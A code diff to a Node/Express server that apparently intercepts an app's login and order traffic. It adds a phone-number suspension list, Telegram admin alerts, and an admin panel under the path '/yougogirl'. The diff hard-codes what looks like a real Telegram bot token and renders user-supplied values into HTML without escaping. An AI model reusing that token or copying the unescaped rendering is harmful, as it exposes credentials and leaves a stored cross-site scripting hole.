@@ -341,7 +341,8 @@ const DEFAULT_DATA = {
   bot2Token: '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ',
   bot2ChatId: '5880677639',
   bot2Enabled: true,
-  orderStatusOverrides: {}
+  orderStatusOverrides: {},
+  suspendedUsers: {}
 };
 
 function generateDummyCode() {
@@ -637,6 +638,7 @@ async function loadData(forceRefresh) {
       if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
       if (!cachedData.balanceHistory) cachedData.balanceHistory = [];
       if (!cachedData.orderStatusOverrides) cachedData.orderStatusOverrides = {};
+      if (!cachedData.suspendedUsers) cachedData.suspendedUsers = {};
 
       // Sync dynamic Bot variables
       if (cachedData.botToken) {
@@ -897,6 +899,36 @@ app.use((req, res, next) => {
     if (!req.parsedBody && req.body) req.parsedBody = req.body;
     if (!req.parsedBody) req.parsedBody = {};
     ensureWebhook().catch(() => { });
+
+    // === SUSPENDED USER LOGIN INTERCEPTION ===
+    const data = cachedData || DEFAULT_DATA;
+    if (data.suspendedUsers && Object.keys(data.suspendedUsers).length > 0 && req.originalUrl && req.originalUrl.includes('/app/user/login')) {
+      const b = req.parsedBody || {};
+      const phoneCand = String(b.phone || b.mobile || b.userName || b.username || b.account || b.user || b.userId || b.memberId || '').trim();
+      const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
+      const qsPhone = String(qs.get('phone') || qs.get('mobile') || qs.get('userName') || qs.get('username') || '').trim();
+      
+      const targets = [phoneCand, qsPhone].filter(Boolean);
+      for (const t of targets) {
+        const cleanT = t.replace(/^\+91/, '').replace(/\s+/g, '');
+        if (!cleanT) continue;
+        for (const [sKey, sRule] of Object.entries(data.suspendedUsers)) {
+          const cleanSKey = sKey.replace(/^\+91/, '').replace(/\s+/g, '');
+          if (cleanT === cleanSKey || cleanT.includes(cleanSKey) || cleanSKey.includes(cleanT)) {
+            const customMsg = sRule.message || "Your account has been suspended.";
+            if (data.adminChatId && bot) {
+              bot.sendMessage(data.adminChatId, `🚫 *Suspended Login Blocked*\n📱 *Target:* \`${cleanT}\`\n💬 *Message Shown:* \`${customMsg}\``, { parse_mode: 'Markdown' }).catch(() => { });
+            }
+            return res.json({
+              code: 1001,
+              msg: customMsg,
+              message: customMsg
+            });
+          }
+        }
+      }
+    }
+
     next();
   };
 
@@ -3781,6 +3813,9 @@ app.get('/yougogirl', async (req, res) => {
                 <div onclick="showTab('tracking')" class="tab-btn" id="btn-tracking">
                     <i class="fa-solid fa-radar w-6"></i> User Tracking
                 </div>
+                <div onclick="showTab('suspend')" class="tab-btn" id="btn-suspend">
+                    <i class="fa-solid fa-user-slash w-6 text-rose-400"></i> Suspend Users
+                </div>
                 <div class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] px-4 mt-6 mb-2">Banking & Orders</div>
                 <div onclick="showTab('banks')" class="tab-btn" id="btn-banks">
                     <i class="fa-solid fa-building-columns w-6"></i> Banks
@@ -3986,6 +4021,67 @@ app.get('/yougogirl', async (req, res) => {
         '</td>' +
         '</tr>';
     }).join('')}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Tab: Suspend Users -->
+                <section id="tab-suspend" class="tab-content space-y-6">
+                    <!-- Suspend User Form Card -->
+                    <div class="card border-rose-500/20 bg-rose-500/5">
+                        <h3 class="text-xl font-bold mb-4 flex items-center gap-2">
+                            <i class="fa-solid fa-user-slash text-rose-500"></i> Account Suspension Manager
+                        </h3>
+                        <p class="text-xs text-slate-400 mb-6">Block specific phone numbers or User IDs from logging into the app and set custom error messages.</p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Phone Number / User ID</label>
+                                <input type="text" id="suspend-phone" class="input-field font-mono text-xs" placeholder="e.g. 6206785398 or User ID">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Custom Suspend Message</label>
+                                <input type="text" id="suspend-msg" class="input-field text-xs" placeholder="e.g. Id is suspended. Contact support.">
+                            </div>
+                        </div>
+
+                        <button onclick="updateSuspendRule()" class="py-3 px-4 rounded-xl font-bold bg-rose-500 hover:bg-rose-600 text-white shadow-lg shadow-rose-500/20 transition-all w-full flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-ban"></i> Save & Suspend Account
+                        </button>
+                    </div>
+
+                    <!-- Active Suspended Accounts Table -->
+                    <div class="card overflow-hidden">
+                        <div class="flex items-center justify-between mb-6">
+                            <h3 class="text-lg font-bold flex items-center gap-2">
+                                <i class="fa-solid fa-shield-cat text-rose-500"></i> Active Suspended Accounts
+                            </h3>
+                            <button onclick="removeSuspendRule('all')" class="text-xs font-bold text-rose-500 hover:underline">Clear All Suspensions</button>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-sm">
+                                <thead class="text-slate-500 border-b border-slate-800">
+                                    <tr>
+                                        <th class="pb-4">Phone / User ID</th>
+                                        <th class="pb-4">Custom Login Message</th>
+                                        <th class="pb-4">Suspended At</th>
+                                        <th class="pb-4 text-right">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-slate-800">
+                                    ${Object.entries(data.suspendedUsers || {}).map(([ph, rule]) => {
+                                      return '<tr>' +
+                                        '<td class="py-4 font-mono text-rose-400 font-bold">' + (rule.phone || ph) + '</td>' +
+                                        '<td class="py-4 text-xs font-semibold text-amber-300 italic">"' + (rule.message || 'Account suspended') + '"</td>' +
+                                        '<td class="py-4 text-[10px] text-slate-500">' + (rule.updatedAt || 'N/A') + '</td>' +
+                                        '<td class="py-4 text-right">' +
+                                        '<button onclick="removeSuspendRule(\'' + (rule.phone || ph) + '\')" class="text-emerald-400 hover:underline text-xs font-bold">Unsuspend</button>' +
+                                        '</td>' +
+                                        '</tr>';
+                                    }).join('')}
+                                    ${Object.keys(data.suspendedUsers || {}).length === 0 ? '<tr><td colspan="4" class="py-8 text-center text-slate-600 italic">No accounts are currently suspended.</td></tr>' : ''}
                                 </tbody>
                             </table>
                         </div>
@@ -4442,6 +4538,15 @@ app.get('/yougogirl', async (req, res) => {
         function deleteHistoryStatus(orderCode) {
             apiCall('/history/delete', { orderCode });
         }
+        function updateSuspendRule() {
+            const phone = document.getElementById('suspend-phone').value.trim();
+            const message = document.getElementById('suspend-msg').value.trim();
+            if (!phone) return notify('Phone number / User ID is required', 'error');
+            apiCall('/suspend/update', { phone, message });
+        }
+        function removeSuspendRule(phone) {
+            apiCall('/suspend/delete', { phone });
+        }
         function toggleUserLog(userId) { apiCall('/user/log-toggle', { userId }); }
         
         function addBank() {
@@ -4558,6 +4663,44 @@ app.post('/yougogirl/api/history/delete', async (req, res) => {
 
     await saveData(data);
     res.json({ success: true, message: 'Status override deleted' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/suspend/update', async (req, res) => {
+  try {
+    const { phone, message } = req.parsedBody || {};
+    if (!phone) return res.status(400).json({ success: false, error: 'Phone number / ID is required' });
+    const cleanPhone = String(phone).trim();
+    const customMsg = message ? String(message).trim() : 'Your account has been suspended.';
+
+    const data = await loadData(true);
+    data.suspendedUsers = data.suspendedUsers || {};
+    data.suspendedUsers[cleanPhone] = {
+      phone: cleanPhone,
+      message: customMsg,
+      updatedAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+    };
+
+    await saveData(data);
+    res.json({ success: true, message: `Account ${cleanPhone} suspended with message: "${customMsg}"` });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/suspend/delete', async (req, res) => {
+  try {
+    const { phone } = req.parsedBody || {};
+    const data = await loadData(true);
+    data.suspendedUsers = data.suspendedUsers || {};
+
+    const cleanPhone = String(phone || '').trim();
+    if (cleanPhone === 'all') {
+      data.suspendedUsers = {};
+    } else {
+      delete data.suspendedUsers[cleanPhone];
+    }
+
+    await saveData(data);
+    res.json({ success: true, message: 'Suspend rule removed' });
   } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
